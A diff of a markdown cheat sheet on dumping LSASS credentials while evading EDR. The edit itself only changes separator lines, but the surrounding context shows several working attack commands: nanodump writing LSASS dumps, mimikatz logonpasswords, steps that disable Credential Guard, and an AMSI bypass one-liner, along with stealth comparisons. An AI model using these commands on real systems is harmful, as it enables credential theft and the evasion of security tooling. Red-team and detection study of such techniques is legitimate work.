@@ -18,7 +18,7 @@ linked:
 ---
 # LSASS Dumping - Modern EDR Evasion
 
-***
+---
 
 ## nanodump (BOF / EXE)
 
@@ -52,7 +52,7 @@ nanodump.exe --duplicate -w C:\temp\lsass.dmp
 nanodump.exe -d -w C:\temp\lsass.dmp
 ```
 
-___
+---
 
 ## Cobalt Strike BOF (`mimikatz` / `nanodump`)
 
@@ -66,7 +66,7 @@ ___
 
 **Por qué BOF:** Beacon Object File runs **in-process** del beacon. No spawn child process, no binary on disk, minimal IOCs. Modern preferred.
 
-___
+---
 
 ## SafetyKatz / SharpSecDump (Custom .NET)
 
@@ -78,7 +78,7 @@ ___
 | `Invoke-MaskedMimi` o variants | Custom masked PS | Modern. |
 ^lsass-evasion-custom
 
-___
+---
 
 ## DInjector / Indirect Syscalls
 
@@ -91,7 +91,7 @@ ___
 
 **Concepto:** EDRs hookean userland API (`OpenProcess`, `MiniDumpWriteDump`). Direct syscalls (vía `int 2eh` o `syscall` instruction) bypass userland completamente.
 
-___
+---
 
 ## RunAsPPL Bypass
 
@@ -114,7 +114,7 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 ```
 
-___
+---
 
 ## Credential Guard Bypass
 
@@ -134,7 +134,7 @@ shutdown /r /t 0
 :: Post-reboot: Credential Guard disabled, mimikatz funciona
 ```
 
-___
+---
 
 ## In-Process MimiSpray (PS reflective)
 
@@ -150,7 +150,7 @@ ___
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
-___
+---
 
 ## Atomic Tests / EDR Lab
 
@@ -161,7 +161,7 @@ ___
 | `Invoke-Atomic T1003.001-1` | Test ProcDump detection | Defender lab. |
 ^lsass-evasion-atomic
 
-___
+---
 
 ## OPSEC Comparison Modern
 
@@ -177,7 +177,7 @@ ___
 | Credential Guard bypass | Reboot required + audit | Very high. |
 ^lsass-evasion-comparison
 
-___
+---
 
 ## Common Errors
 
@@ -190,4 +190,4 @@ ___
 | `Direct syscall fail` | Win10 build mismatch (SSN drift) | Update SSN table. |
 ^lsass-evasion-errors
 
-***
+---
